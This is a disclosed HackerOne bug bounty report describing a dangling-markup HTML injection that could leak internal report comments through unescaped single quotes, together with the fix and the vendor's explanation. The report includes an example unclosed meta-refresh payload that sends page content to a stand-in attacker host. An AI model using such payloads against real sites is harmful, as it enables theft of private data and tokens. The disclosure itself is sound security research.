{
  "id": 110578,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA1Nzg=",
  "url": "https://hackerone.com/reports/110578",
  "title": "HTML injection can lead to data theft",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-01-13T23:59:29.009Z",
  "submitted_at": "2016-01-13T23:59:29.009Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "intidc",
    "url": "/intidc",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-01-26T16:05:58.643Z",
  "bug_reporter_agreed_on_going_public_at": "2016-01-26T16:05:58.005Z",
  "team_member_agreed_on_going_public_at": "2016-01-26T02:26:36.122Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hey,\n\nThis is more like an in-depth security thing with a reasonable attack scenario.\n\nIn some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:\n\n1. There's a HTML injection vulnerability\n2. The sensitive data is preceded by the HTML injection vulnerability\n3. After the sensitive data, there's a single quote (could be inserted by the attacker)\n\nDue to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.\n\nThe problem is that HackerOne does not convert single quotes to their HTML entities (&lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\n\n## Example\n\nSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:\n\n[report title]\n\\> reporter: report body\n < vendor: reply\n < vendor: internal reply\n\\> reporter: comment (that contains a single quote)\n\nAt this point, if the reporter would add the following to the summary (above the report body):\n\n> <meta http-equiv=\"refresh\" content='0; url=https://evil.com/log.php?text=\n\nThis will send the following to the server:\n\n>report body + vendor reply + internal reply\n\nBecause the unconverted ' in the last comment would close the attribute and form a valid HTML element.\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.\n\nAnother vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.\n\n## The fix\n\nThe behavior described above can easily be prevented.: \n\nI'd just add the conversion to &lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.\n\n\nBest regards\n\n\nInti",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 57,
    "name": "Violation of Secure Design Principles"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-02-25T02:26:36.443Z",
  "allow_singular_disclosure_after": -251458077.06901768,
  "singular_disclosure_allowed": true,
  "vote_count": 19,
  "voters": [
    "trieulieuf9",
    "shubham_srt",
    "intidc",
    "its_afolic",
    "updatelap",
    "r3y",
    "satishpk1",
    "japz",
    "spetr0x",
    "safisecu",
    "and 9 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 1257,
      "category": "team",
      "content": "There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.\n\nWe rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via `dangerouslySetInnerHTML` in our React component. Because it turns out that we weren't properly escaping this HTML output, this could potentially be exploited.\n\nAll other non-Markdown user-generated content is displayed via React without using `dangerouslySetInnerHTML`, so it is auto-escaped by React and thus not vulnerable to an exploit.",
      "user": {
        "id": 15236,
        "username": "andrewone",
        "name": "Andrew Wong",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "San Francisco",
        "created_at": "2014-12-12T22:07:54.110Z",
        "url": "https://hackerone.com/andrewone",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 1260,
      "category": "researcher",
      "content": "Navigation is something a content security policy can't cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent `&#39;`, as both single and double quotes can be used to enclose an attribute value.",
      "user": {
        "id": 2322,
        "username": "intidc",
        "name": "Inti De Ceukelaire",
        "bio": "@securinti",
        "cleared": true,
        "verified": true,
        "website": "http://twitter.com/securinti",
        "location": "Oilsjt, Belgium",
        "created_at": "2014-01-19T21:00:55.430Z",
        "url": "https://hackerone.com/intidc",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/002/322/cb30ac31b7653e73d6dd5a0f0e2cfeed113d2feb_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
